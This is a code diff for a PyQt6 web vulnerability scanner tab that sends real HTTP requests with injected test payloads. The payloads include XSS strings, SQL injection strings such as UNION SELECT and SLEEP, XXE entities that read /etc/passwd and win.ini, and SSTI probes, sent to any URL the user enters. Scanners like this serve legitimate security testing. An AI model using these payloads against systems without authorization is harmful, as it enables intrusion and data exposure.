@@ -1,68 +1,323 @@
+# scan_tab.py - متناسب با ساختار فایل‌های شما
 from PyQt6.QtWidgets import (QWidget, QVBoxLayout, QHBoxLayout, QLabel, 
                              QLineEdit, QPushButton, QCheckBox, QGroupBox,
                              QFormLayout, QSpinBox, QDoubleSpinBox, QProgressBar,
                              QComboBox, QTextEdit, QMessageBox)
 from PyQt6.QtCore import Qt, QThread, pyqtSignal
+import requests
+import time
+from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
 
 
 class ScanWorker(QThread):
     vulnerability_found = pyqtSignal(dict)
     scan_completed = pyqtSignal(list)
     progress_updated = pyqtSignal(int)
+    status_updated = pyqtSignal(str)
     
-    def __init__(self, target_url, scan_types):
+    def __init__(self, target_url, scan_types, timeout, verify_ssl, delay):
         super().__init__()
         self.target_url = target_url
         self.scan_types = scan_types
+        self.timeout = timeout
+        self.verify_ssl = verify_ssl
+        self.delay = delay
         self.should_stop = False
+    
+    def fetch_url(self, url, method='GET', data=None, headers=None):
+        try:
+            start_time = time.time()
+            
+            if method == 'GET':
+                response = requests.get(
+                    url,
+                    timeout=self.timeout,
+                    verify=self.verify_ssl,
+                    allow_redirects=True,
+                    headers=headers or {}
+                )
+            else:
+                response = requests.post(
+                    url,
+                    data=data,
+                    timeout=self.timeout,
+                    verify=self.verify_ssl,
+                    allow_redirects=True,
+                    headers=headers or {}
+                )
+            
+            response_time = time.time() - start_time
+            
+            return {
+                'content': response.text,
+                'status_code': response.status_code,
+                'response_time': response_time,
+                'headers': dict(response.headers)
+            }
+        except Exception as e:
+            return {
+                'content': str(e),
+                'status_code': 0,
+                'response_time': 0,
+                'headers': {}
+            }
+    
+    def inject_payload_in_url(self, base_url, payload):
+        parsed = urlparse(base_url)
+        params = parse_qs(parsed.query)
+        
+        if params:
+            for key in params.keys():
+                params[key] = [payload]
+            new_query = urlencode(params, doseq=True)
+            return urlunparse((parsed.scheme, parsed.netloc, parsed.path, 
+                             parsed.params, new_query, parsed.fragment))
+        else:
+            separator = '&' if '?' in base_url else '?'
+            return f"{base_url}{separator}test={payload}"
     
     def run(self):
         vulnerabilities = []
-        total = len(self.scan_types)
+        total_scans = len(self.scan_types)
+        
+        self.status_updated.emit(f'🎯 Target: {self.target_url}')
+        
+        base_response = self.fetch_url(self.target_url)
+        if base_response['status_code'] == 0:
+            self.status_updated.emit('❌ Failed to connect to target')
+            self.scan_completed.emit([])
+            return
+        
+        self.status_updated.emit(f'✅ Connected (Status: {base_response["status_code"]})')
         
         for idx, scan_type in enumerate(self.scan_types):
             if self.should_stop:
                 break
             
             try:
-                if scan_type == 'XSS':
-                    from scanners.xss_scanner import XSSScanner
-                    scanner = XSSScanner()
-                    payloads = ['<script>alert(1)</script>', '<img src=x onerror=alert(1)>']
-                    response = {'content': '', 'status_code': 200, 'response_time': 0.5, 'headers': {}}
-                    vulns = scanner.scan(self.target_url, response, payloads)
-                    vulnerabilities.extend(vulns)
-                    
-                elif scan_type == 'SQL':
-                    from scanners.sql_scanner import SQLScanner
-                    scanner = SQLScanner()
-                    payloads = ["' OR '1'='1", "1' UNION SELECT NULL--"]
-                    response = {'content': '', 'status_code': 200, 'response_time': 0.5, 'headers': {}}
-                    vulns = scanner.scan(self.target_url, response, payloads)
-                    vulnerabilities.extend(vulns)
-                    
-                elif scan_type == 'RCE':
-                    from scanners.rce_scanner import RCEScanner
-                    scanner = RCEScanner()
-                    response = {'content': '', 'status_code': 200, 'response_time': 0.5, 'headers': {}}
-                    vulns = scanner.scan(self.target_url, response)
-                    vulnerabilities.extend(vulns)
+                self.status_updated.emit(f'🔍 Running {scan_type} scanner...')
+                vulns = []
                 
-                for vuln in vulns if 'vulns' in locals() else []:
+                if scan_type == 'XSS':
+                    vulns = self.scan_xss()
+                elif scan_type == 'SQL':
+                    vulns = self.scan_sql()
+                elif scan_type == 'RCE':
+                    vulns = self.scan_rce()
+                elif scan_type == 'CommandInjection':
+                    vulns = self.scan_command_injection()
+                elif scan_type == 'SSRF':
+                    vulns = self.scan_ssrf()
+                elif scan_type == 'CSRF':
+                    vulns = self.scan_csrf()
+                elif scan_type == 'XXE':
+                    vulns = self.scan_xxe()
+                elif scan_type == 'FileUpload':
+                    vulns = self.scan_file_upload()
+                elif scan_type == 'API':
+                    vulns = self.scan_api()
+                elif scan_type == 'WebSocket':
+                    vulns = self.scan_websocket()
+                elif scan_type == 'GraphQL':
+                    vulns = self.scan_graphql()
+                elif scan_type == 'SSTI':
+                    vulns = self.scan_ssti()
+                elif scan_type == 'LDAP':
+                    vulns = self.scan_ldap()
+                elif scan_type == 'OAuth2':
+                    vulns = self.scan_oauth()
+                
+                vulnerabilities.extend(vulns)
+                
+                for vuln in vulns:
                     self.vulnerability_found.emit({
-                        'type': vuln.vulnerability_type,
-                        'severity': vuln.severity,
-                        'url': vuln.url,
-                        'evidence': vuln.evidence
+                        'type': getattr(vuln, 'vulnerability_type', 'Unknown'),
+                        'severity': getattr(vuln, 'severity', 'Unknown'),
+                        'url': getattr(vuln, 'url', self.target_url),
+                        'evidence': getattr(vuln, 'evidence', 'No evidence')
                     })
                 
-                progress = int((idx + 1) / total * 100)
+                self.status_updated.emit(f'✅ {scan_type}: {len(vulns)} vulnerabilities')
+                
+                progress = int((idx + 1) / total_scans * 100)
                 self.progress_updated.emit(progress)
                 
+                time.sleep(self.delay)
+                
             except Exception as e:
-                print(f"Error scanning {scan_type}: {e}")
+                self.status_updated.emit(f'❌ Error in {scan_type}: {str(e)}')
+                import traceback
+                traceback.print_exc()
         
+        self.status_updated.emit(f'🎉 Scan completed - Total: {len(vulnerabilities)} vulnerabilities')
         self.scan_completed.emit(vulnerabilities)
+    
+    def scan_xss(self):
+        from scanners.xss_scanner import XSSScanner
+        scanner = XSSScanner()
+        
+        payloads = [
+            '<script>alert(1)</script>',
+            '<img src=x onerror=alert(1)>',
+            '"><script>alert(1)</script>',
+            '<svg onload=alert(1)>',
+            'javascript:alert(1)',
+            '<iframe src="javascript:alert(1)">',
+            '<body onload=alert(1)>'
+        ]
+        
+        all_vulns = []
+        for payload in payloads:
+            if self.should_stop:
+                break
+            
+            test_url = self.inject_payload_in_url(self.target_url, payload)
+            response = self.fetch_url(test_url)
+            vulns = scanner.scan(test_url, response, [payload])
+            all_vulns.extend(vulns)
+            
+            if vulns:
+                break
+        
+        return all_vulns
+    
+    def scan_sql(self):
+        from scanners.sql_scanner import SQLScanner
+        scanner = SQLScanner()
+        
+        payloads = [
+            "' OR '1'='1",
+            "1' UNION SELECT NULL--",
+            "' AND 1=1--",
+            "' AND SLEEP(5)--",
+            "1' OR '1'='1' /*",
+            "admin'--",
+            "' OR 1=1--"
+        ]
+        
+        all_vulns = []
+        for payload in payloads:
+            if self.should_stop:
+                break
+            
+            test_url = self.inject_payload_in_url(self.target_url, payload)
+            response = self.fetch_url(test_url)
+            vulns = scanner.scan(test_url, response, [payload])
+            all_vulns.extend(vulns)
+            
+            if vulns:
+                break
+        
+        return all_vulns
+    
+    def scan_rce(self):
+        from scanners.rce_scanner import RCEScanner
+        scanner = RCEScanner()
+        
+        response = self.fetch_url(self.target_url)
+        return scanner.scan(self.target_url, response)
+    
+    def scan_command_injection(self):
+        from scanners.command_injection_scanner import CommandInjectionScanner
+        scanner = CommandInjectionScanner()
+        
+        response = self.fetch_url(self.target_url)
+        return scanner.scan(self.target_url, response)
+    
+    def scan_ssrf(self):
+        from scanners.ssrf_scanner import SSRFScanner
+        scanner = SSRFScanner()
+        
+        response = self.fetch_url(self.target_url)
+        return scanner.scan(self.target_url, response)
+    
+    def scan_csrf(self):
+        from scanners.csrf_scanner import CSRFScanner
+        scanner = CSRFScanner()
+        
+        response = self.fetch_url(self.target_url)
+        return scanner.scan(self.target_url, response)
+    
+    def scan_xxe(self):
+        from scanners.xxe_scanner import XXEScanner
+        scanner = XXEScanner()
+        
+        payloads = [
+            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
+            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>'
+        ]
+        
+        response = self.fetch_url(self.target_url)
+        return scanner.scan(self.target_url, response, payloads)
+    
+    def scan_file_upload(self):
+        from scanners.file_upload_scanner import FileUploadScanner
+        scanner = FileUploadScanner()
+        
+        response = self.fetch_url(self.target_url)
+        return scanner.scan(self.target_url, response)
+    
+    def scan_api(self):
+        from scanners.api_scanner import APIScanner
+        scanner = APIScanner()
+        
+        response = self.fetch_url(self.target_url)
+        return scanner.scan_oauth(self.target_url, response)
+    
+    def scan_websocket(self):
+        from scanners.websocket_scanner import WebSocketScanner
+        scanner = WebSocketScanner()
+        
+        response = self.fetch_url(self.target_url)
+        return scanner.scan(self.target_url, response)
+    
+    def scan_graphql(self):
+        from scanners.graphql_scanner import GraphQLScanner
+        scanner = GraphQLScanner()
+        
+        response = self.fetch_url(self.target_url)
+        return scanner.scan(self.target_url, response)
+    
+    def scan_ssti(self):
+        from scanners.ssti_scanner import SSTIScanner
+        scanner = SSTIScanner()
+        
+        payloads = [
+            '{{7*7}}',
+            '${7*7}',
+            '<%=7*7%>',
+            '{7*7}',
+            '#{7*7}'
+        ]
+        
+        all_vulns = []
+        for payload in payloads:
+            if self.should_stop:
+                break
+            
+            test_url = self.inject_payload_in_url(self.target_url, payload)
+            response = self.fetch_url(test_url)
+            vulns = scanner.scan(test_url, response)
+            all_vulns.extend(vulns)
+            
+            if vulns:
+                break
+        
+        return all_vulns
+    
+    def scan_ldap(self):
+        from scanners.ldap_scanner import LDAPScanner
+        scanner = LDAPScanner()
+        
+        response = self.fetch_url(self.target_url)
+        return scanner.scan(self.target_url, response)
+    
+    def scan_oauth(self):
+        from scanners.oauth_saml_scanner import OAuthSAMLScanner
+        scanner = OAuthSAMLScanner()
+        
+        response = self.fetch_url(self.target_url)
+        return scanner.scan_oauth(self.target_url, response)
     
     def stop(self):
         self.should_stop = True
@@ -97,20 +352,20 @@ class ScanTab(QWidget):
         scanner_group = QGroupBox('Scanner Selection')
         scanner_layout = QVBoxLayout()
         
-        self.xss_checkbox = QCheckBox('XSS Injection')
-        self.sql_checkbox = QCheckBox('SQL Injection')
-        self.rce_checkbox = QCheckBox('Remote Code Execution')
-        self.cmd_checkbox = QCheckBox('Command Injection')
-        self.ssrf_checkbox = QCheckBox('Server-Side Request Forgery')
-        self.csrf_checkbox = QCheckBox('CSRF (Cross-Site Request Forgery)')
-        self.xxe_checkbox = QCheckBox('XXE (XML External Entity)')
-        self.upload_checkbox = QCheckBox('File Upload Vulnerabilities')
-        self.api_checkbox = QCheckBox('API Security Testing')
-        self.websocket_checkbox = QCheckBox('WebSocket Security')
-        self.graphql_checkbox = QCheckBox('GraphQL Testing')
-        self.ssti_checkbox = QCheckBox('Server-Side Template Injection')
-        self.ldap_checkbox = QCheckBox('LDAP Injection')
-        self.oauth_checkbox = QCheckBox('OAuth2/SAML')
+        self.xss_checkbox = QCheckBox('🔴 XSS Injection')
+        self.sql_checkbox = QCheckBox('💉 SQL Injection')
+        self.rce_checkbox = QCheckBox('💣 Remote Code Execution')
+        self.cmd_checkbox = QCheckBox('⚡ Command Injection')
+        self.ssrf_checkbox = QCheckBox('🌐 Server-Side Request Forgery')
+        self.csrf_checkbox = QCheckBox('🔗 CSRF (Cross-Site Request Forgery)')
+        self.xxe_checkbox = QCheckBox('📄 XXE (XML External Entity)')
+        self.upload_checkbox = QCheckBox('📁 File Upload Vulnerabilities')
+        self.api_checkbox = QCheckBox('🔌 API Security Testing')
+        self.websocket_checkbox = QCheckBox('🔌 WebSocket Security')
+        self.graphql_checkbox = QCheckBox('📊 GraphQL Testing')
+        self.ssti_checkbox = QCheckBox('🎭 Server-Side Template Injection')
+        self.ldap_checkbox = QCheckBox('🔐 LDAP Injection')
+        self.oauth_checkbox = QCheckBox('🔑 OAuth2/SAML')
         
         for checkbox in [self.xss_checkbox, self.sql_checkbox, self.rce_checkbox,
                         self.cmd_checkbox, self.ssrf_checkbox, self.csrf_checkbox,
@@ -120,7 +375,7 @@ class ScanTab(QWidget):
             scanner_layout.addWidget(checkbox)
             checkbox.setChecked(True)
         
-        select_all_btn = QPushButton('Select All')
+        select_all_btn = QPushButton('Select All / Deselect All')
         select_all_btn.clicked.connect(self.select_all_scanners)
         scanner_layout.addWidget(select_all_btn)
         
@@ -154,6 +409,9 @@ class ScanTab(QWidget):
         settings_group.setLayout(settings_layout)
         main_layout.addWidget(settings_group)
         
+        self.status_label = QLabel('Ready')
+        main_layout.addWidget(self.status_label)
+        
         self.progress_bar = QProgressBar()
         self.progress_bar.setValue(0)
         main_layout.addWidget(self.progress_bar)
@@ -185,6 +443,10 @@ class ScanTab(QWidget):
         target_url = self.target_url_input.text().strip()
         if not target_url:
             QMessageBox.warning(self, 'Warning', 'Please enter a target URL')
+            return
+        
+        if not target_url.startswith('http'):
+            QMessageBox.warning(self, 'Warning', 'URL must start with http:// or https://')
             return
         
         scan_types = []
@@ -225,13 +487,19 @@ class ScanTab(QWidget):
         self.start_button.setEnabled(False)
         self.stop_button.setEnabled(True)
         self.progress_bar.setValue(0)
+        self.status_label.setText('🚀 Starting scan...')
         
         self.scan_started.emit(target_url)
         
-        self.scan_worker = ScanWorker(target_url, scan_types)
+        timeout = self.timeout_spinbox.value()
+        verify_ssl = self.verify_ssl_checkbox.isChecked()
+        delay = self.delay_spinbox.value()
+        
+        self.scan_worker = ScanWorker(target_url, scan_types, timeout, verify_ssl, delay)
         self.scan_worker.vulnerability_found.connect(self.on_vulnerability_found)
         self.scan_worker.scan_completed.connect(self.on_scan_completed)
         self.scan_worker.progress_updated.connect(self.progress_bar.setValue)
+        self.scan_worker.status_updated.connect(self.status_label.setText)
         self.scan_worker.start()
     
     def stop_scan(self):
@@ -242,6 +510,7 @@ class ScanTab(QWidget):
         self.is_scanning = False
         self.start_button.setEnabled(True)
         self.stop_button.setEnabled(False)
+        self.status_label.setText('⏹️ Scan stopped')
     
     def on_vulnerability_found(self, vulnerability: dict):
         self.vulnerability_found.emit(vulnerability)
@@ -265,6 +534,7 @@ class ScanTab(QWidget):
     def clear_inputs(self):
         self.target_url_input.clear()
         self.progress_bar.setValue(0)
+        self.status_label.setText('Ready')
     
     def set_auth_manager(self, auth_manager):
         pass
